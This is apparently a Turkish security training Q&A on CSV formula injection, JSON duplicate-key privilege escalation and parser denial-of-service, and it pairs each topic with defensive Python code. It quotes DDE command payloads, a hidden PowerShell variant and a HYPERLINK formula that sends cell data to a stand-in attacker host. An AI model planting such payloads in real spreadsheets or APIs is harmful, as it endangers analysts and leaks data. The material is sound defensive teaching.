# GÜN 079: CSV VE JSON VERİ İŞLEME — SORU VE CEVAPLAR
# ÖZEL LİSANS — TÜM HAKLAR SAKLIDIR
# Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)
# Bu yazılım ve ilgili tüm dosyalar ("Yazılım") yalnızca görüntüleme ve eğitim amaçlı olarak paylaşılmıştır.
# YASAKLAR: Kopyalanamaz, çoğaltılamaz, dağıtılamaz, değiştirilemez, satılamaz, tersine mühendislik yapılamaz.
# İZİN VERİLEN KULLANIM: GitHub üzerinde görüntüleme ve inceleme (kopyalamadan).
# YAZARIN AÇIK YAZILI İZNİ OLMAKSIZIN HİÇBİR KULLANIM HAKKI TANINMAZ.

---

## SORU 1 (G079-SC1): CSV FORMÜL ENJEKSİYONU (CWE-1236) VE DDE SALDIRI DİNAMİĞİ

### Soru Başlığı ve Tanımı
CSV Formül Enjeksiyonu (Formula Injection / DDE Code Execution) nedir? Saldırganlar virgülle ayrılmış düz bir metin dosyası aracılığıyla, güvenlik analistlerinin kullandığı Microsoft Excel veya LibreOffice Calc yazılımları üzerinde nasıl komut çalıştırır veya veri sızdırır? Bu saldırıya karşı tek tırnak (`'`) tabanlı hücre nötralizasyonu nasıl çalışır?

### Derinlemesine Teknik Analiz
CSV formatı kendi başına herhangi bir çalıştırma ortamı sunmayan saf metin dosyasıdır. Ancak kurumsal ortamlarda güvenlik logları, SIEM çıktıları ve denetim raporları doğrudan elektronik tablo programlarına (Excel, Calc) aktarılır. Bu yazılımlar hücre değerlerinin ilk karakterine bakarak tür tahmini yapar:
1. **Tetikleyici Karakterler:** Bir hücre `=`, `+`, `-`, `@`, `\t` veya `\r` ile başladığında yazılım bunu formül olarak ele alır.
2. **DDE (Dynamic Data Exchange) Protokolü:** Windows işletim sisteminde çalışan programlar arasında dinamik veri aktarımı sağlayan eski bir protokoldür. Excel, `=cmd|'/C calc'!A0` gibi bir hücre gördüğünde işletim sistemi seviyesinde `cmd.exe` sürecini başlatarak harici komut koşturabilir.
3. **Formül ile Veri Sızdırma:** Saldırgan `=HYPERLINK("https://attacker-c2.com/leak?q="&A2&"_"&B2, "Detay")` formülünü enjekte ettiğinde, analist linke tıkladığı anda tablodaki diğer hücrelerde yer alan hassas veriler (parolalar, IP'ler, tokenlar) saldırganın HTTP sunucusuna taşınır.
4. **Tek Tırnak Nötralizasyonu:** Bir hücrenin en başına tek tırnak (`'`) karakteri konulduğunda (örneğin `'=cmd|'calc'!A0`), elektronik tablo motoru hücreyi "Salt Düz Metin" (Verbatim Text) olarak yorumlar. Ekranda tek tırnak görünmez, ancak formül motoru devre dışı kalarak zararlı kodun tetiklenmesi kesinlikle önlenir.

### Gerçek Dünya Senaryosu ve Pratik Çözüm
Bir e-ticaret veya bankacılık uygulamasında saldırgan, kullanıcı profil adını veya transfer açıklamasını `=cmd|'/C powershell -w hidden -enc ...'!A0` olarak kaydeder. Gün sonunda dolandırıcılık tespit ekibi şüpheli işlemleri CSV olarak dışarı aktarır ve Excel'de açar. Analist uyarı penceresini dikkatsizce onayladığı anda analistin bilgisayarı ele geçirilir.

**Pratik Çözüm (Python Güvenli CSV Hücre Nötralizasyonu):**
```python
DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

def sanitize_csv_cell(cell_value: str) -> str:
    if not isinstance(cell_value, str):
        return str(cell_value)
    stripped = cell_value.lstrip()
    if stripped.startswith(DANGEROUS_PREFIXES):
        # Hücrenin en başına tek tırnak ekleyerek formülü düz metne hapsediyoruz
        return f"'{cell_value}"
    return cell_value
```

### Ustanın Çırağa Tavsiyesi
Evladım, "ben sadece CSV üretiyorum, dosya açanın kendi güvenliğidir" diyemezsin. Bir güvenlik mühendisi, ürettiği çıktının nerede ve nasıl tüketileceğini bilmek zorundadır. Web arayüzlerinden veya SIEM sistemlerinden CSV dışa aktarımı (export) yazıyorsan, bu süzgeci koymak senin boynunun borcudur. Kullanıcıdan gelen her veriyi tehlikeli kabul edeceksin.

---

## SORU 2 (G079-SC2): JSON MÜKERRER ANAHTAR ÇARPIŞMASI (JSON HIJACKING / PARSER DIFFERENTIAL)

### Soru Başlığı ve Tanımı
JSON formatında mükerrer anahtar çarpışması (Duplicate Key Collision / Key Collision Attack) nedir? RFC 8259 standardındaki esneklik WAF (Web Application Firewall) ile arka uç (backend) sistemleri arasında nasıl bir yetkilendirme atlatma (Privilege Escalation) açığına dönüşür? Python'un standart `json.loads` fonksiyonu bu saldırıya karşı neden varsayılan olarak savunmasızdır ve nasıl sertleştirilir?

### Derinlemesine Teknik Analiz
RFC 8259 Bölüm 4'e göre; JSON nesnelerindeki anahtar isimlerinin benzersiz olması gerektiği ifade edilir, ancak kural çiğnendiğinde ayrıştırıcının ne yapması gerektiği katı bir kurala bağlanmamıştır. Bu durum ayrıştırıcılar arasında davranış farklılığına (Parser Differential) yol açar:
- **Parser 1 (Örneğin Go / Node.js veya bazı WAF'lar):** Nesnede aynı anahtardan birden fazla varsa **ilk anahtarı** kabul eder, diğerlerini yok sayar.
- **Parser 2 (Python `json.loads` varsayılanı):** Nesnede aynı anahtardan birden fazla varsa **son anahtarı** kabul eder, önceki anahtarın değerini ezer.

**Saldırı Senaryosu:**
Saldırgan şu JSON yükünü gönderir:
```json
{
  "role": "user",
  "action": "view_dashboard",
  "role": "admin"
}
```
1. Girişteki WAF veya API Gateway JSON'u inceler; ilk `"role": "user"` anahtarını görür ve isteği onaylayıp arkadaki servise iletir.
2. Arkadaki Python servisi `json.loads(payload)` çalıştırdığında standart sözlük mantığı gereği son gelen `"role": "admin"` değerini tutar.
3. Sonuç: Kullanıcı hiçbir yetkisi olmadığı halde sistemde `"admin"` rolüyle işlem yapar!

### Gerçek Dünya Senaryosu ve Pratik Çözüm
Bir bulut yönetim platformunda API yetkilendirmesi mükerrer anahtarlara izin verdiği için, saldırganlar kimlik doğrulama belirteçlerini yeniden adlandırarak veya rol anahtarlarını çiftleyerek yönetici haklarına erişmiştir.

**Pratik Çözüm (Python `object_pairs_hook` ile Katı Ayrıştırma):**
```python
import json

def enforce_no_duplicate_keys(ordered_pairs):
    result = {}
    for key, value in ordered_pairs:
        if key in result:
            raise ValueError(f"Güvenlik İhlali: Mükerrer JSON anahtarı tespit edildi -> '{key}'")
        result[key] = value
    return result

# Güvenli JSON ayrıştırma
try:
    data = json.loads(raw_json_str, object_pairs_hook=enforce_no_duplicate_keys)
except ValueError as e:
    # Saldırı girişimi anında loglanır ve engellenir
    print(f"Yetkisiz JSON manipülasyonu engellendi: {e}")
```

### Ustanın Çırağa Tavsiyesi
Çırağım, "standart kütüphane yapmışsa bir bildiği vardır" diyerek körü körüne güvenmek siber güvenlikte intihardır. Python'un `json.loads` fonksiyonu performans ve esneklik odaklı tasarlandığı için mükerrer anahtarları sessizce yutar. Sen güvenlik tarafındaysan, belirsizliğe asla izin veremezsin; mükerrer anahtar gördüğün an fail-closed prensibiyle kapıyı kapatacaksın.

---

## SORU 3 (G079-SC3): BÜYÜK VERİ AYRIŞTIRMA VE HİZMET DIŞI BIRAKMA (DoS) SAVUNMASI

### Soru Başlığı ve Tanımı
CSV hücre taşması (Oversized Field DoS) ve JSON Bombası (Deep Recursion Bomb) saldırıları nelerdir? Bir sistemin belleğini (RAM) veya çağrı yığınını (call stack) tüketerek hizmet dışı bırakmaya yönelik bu saldırılara karşı savunmacı tavan sınırları (guards & ceilings) mimariye nasıl yerleştirilir?

### Derinlemesine Teknik Analiz
Metin tabanlı veri formatları, ayrıştırıcıların kaynak tüketimi sınırlandırılmadığında son derece ucuz ve etkili DoS silahlarına dönüşür:
1. **CSV Hücre Taşması (Oversized Field):** Saldırgan tek bir hücreye 50 MB'lık rastgele veri basar veya tırnak işaretini kapatmayarak (`"veri...`) dosyanın sonuna kadar olan her şeyi devasa bir tek hücre gibi gösterir. Python'un varsayılan `csv.field_size_limit`'i aşılırsa `_csv.Error` verir; sınır kaldırılmışsa işletim sistemi OOM (Out Of Memory) ile süreci sonlandırır.
2. **JSON Bombası (Derin Özyineleme):** Saldırgan küçük bir dosya boyutuyla (örneğin sadece 2 KB) yüzlerce katman iç içe geçmiş nesne gönderir:
   `{"a": {"b": {"c": {"d": ... } }}}`
   Standart JSON serializer veya validator modülleri bu yapıyı gezerken özyinelemeli fonksiyon çağrıları yapar. Python'un çağrı yığını tavanı (varsayılan 1000 limit) hızla aşılır ve uygulama `RecursionError` alarak anında çöker.

### Gerçek Dünya Senaryosu ve Pratik Çözüm
Bir SIEM log alım servisine gelen günlükler boyut kontrolü olmadan ayrıştırılmaktadır. Bir saldırgan 10 katmanlı iç içe geçmiş JSON objeleriyle sisteme sürekli istek göndererek log toplama altyapısını felç etmiş ve o sırada gerçekleştirdiği veri hırsızlığının loglanmasını engellemiştir.

**Pratik Çözüm (Özyinelemeli Derinlik ve Boyut Tavanı Denetimi):**
```python
def validate_json_depth(node, max_depth=10, current_depth=1):
    if current_depth > max_depth:
        raise ValueError(f"JSON Bombası Engellendi: Derinlik sınırı ({max_depth}) aşıldı!")
    
    if isinstance(node, dict):
        for k, v in node.items():
            validate_json_depth(v, max_depth, current_depth + 1)
    elif isinstance(node, list):
        for item in node:
            validate_json_depth(item, max_depth, current_depth + 1)
```

### Ustanın Çırağa Tavsiyesi
Evladım, sınırsız hiçbir şey güvenlikte barınamaz. Yazdığın her kodun, açtığın her dosyanın, okuduğun her hücrenin ve gezindiğin her ağacın bir "tavanı" olmak zorundadır. Tavan koymadığın gün, bir saldırgan gelir ve sisteminin tavanını senin başına yıkar. Ölçülü ol, sınırlarını kodla çiz.
